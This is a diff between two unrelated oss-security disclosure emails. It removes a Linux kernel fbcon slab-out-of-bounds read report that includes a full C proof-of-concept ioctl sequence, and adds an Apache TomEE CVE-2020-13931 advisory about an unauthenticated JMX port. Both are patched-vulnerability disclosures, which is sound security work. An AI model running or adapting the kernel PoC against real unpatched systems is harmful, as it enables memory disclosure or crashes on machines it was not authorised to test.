@@ -1,75 +1,36 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/11/09/2
-Message-ID: <CAH5WSp7m3OW4zoxCgK5a4+Y3GgWK6jS4=jxHTaXS7bfp2_jgNQ@mail.gmail.com>
-Date: Mon, 9 Nov 2020 22:41:51 +0800
-From: Minh Yuan <yuanmingbuaa@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/12/16/2
+Message-ID: <CAGRgoZh0pZ4LP0s3za98GDqkuLJimhMQugOU4X4h8Rcq444mUg@mail.gmail.com>
+Date: Wed, 16 Dec 2020 16:31:08 +0000
+From: Jonathan Gallimore <jonathan.gallimore@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Linux kernel slab-out-of-bounds Read in fbcon
+Subject: CVE-2020-13931 Apache TomEE - Incorrect config on JMS Resource Adapter can lead to JMX being enabled
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Severity: High
 
-We recently discovered a slab-out-of-bounds read in fbcon in the latest
-kernel ( v5.10-rc2 for now).
+Vendor: The Apache Software Foundation
 
-The root cause of this vulnerability is that "fbcon_copy_font" did not
-handle "vc->vc_font.data" and "vc->vc_font.height" consistently. However,
-the patch <https://lkml.org/lkml/2020/9/27/223> for VT_RESIZEX and the patch
-<https://lkml.org/lkml/2020/9/24/720> for fbcon_get_font() can't handle
-this issue.
+Versions Affected:
+Apache TomEE 8.0.0-M1 - 8.0.3
+Apache TomEE 7.1.0 - 7.1.3
+Apache TomEE 7.0.0-M1 - 7.0.8
+Apache TomEE 1.0.0 - 1.7.5
 
-This is my PoC (it needs the privilege to access tty to trigger this bug):
+Description:
+If Apache TomEE is configured to use the embedded ActiveMQ broker, and the
+broker config is misconfigured, a JMX port is opened on TCP port 1099,
+which does not include authentication. CVE-2020-11969 previously addressed
+the creation of the JMX management interface, however the incomplete fix
+did not cover this edge case.
 
-// author by ziiiro@THU
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/ioctl.h>
-#include <fcntl.h>
-#include <linux/fb.h>
-#include <linux/vt.h>
-#include <linux/kd.h>
-#include <string.h>
+Mitigation:
+- Upgrade to TomEE 7.0.9 or later
+- Upgrade to TomEE 7.1.4 or later
+- Upgrade to TomEE 8.0.4 or later
 
-int main(int argc, char** argv)
-{
-    struct console_font_op op;
-    struct consolefontdesc cfdarg;
-    void *addr = malloc(0x100);
-    memset(addr,'a',0x100);
-    int fd1 = open("/dev/tty1", O_RDWR, 0);
-    int fd2 = open("/dev/tty6", O_RDWR, 0);
-    op.op = KD_FONT_OP_SET;
-    op.width = 8;
-    op.height = 1;
-    op.data = addr;
-    op.charcount = 0x100;
-    // alloc a samll font.data
-    ioctl(fd2,KDFONTOP,&op);
-    op.height = 0x20;
-    // set a large font.height
-    ioctl(fd1, KDFONTOP, &op);
-    op.op = KD_FONT_OP_COPY;
-    // access tty6's font
-    op.height = 5;
-    // use a larger height (tty1) to access the small font.data (tty6)
-    ioctl(fd1,KDFONTOP,&op);
-}
+Ensure the correct VM broker name is used consistently across the resource
+adapter config.
 
-The patch for this bug is available: commit
-3c4e0dff2095c579b142d5a0693257f1c58b4804 (
-https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3c4e0dff2095c579b142d5a0693257f1c58b4804
-)
-
-Timeline:
-* 6/11/20 - Vulnerability reported to security@...nel.org and
-linux-distros@...openwall.org.
-* 9/11/20 - Vulnerability patched.
-* 9/11/20 - Vulnerability public.
-
-Regards,
-
-Yuan Ming from Tsinghua University
+Credit: Thanks to Frans Henskens for discovering and reporting this issue.
 
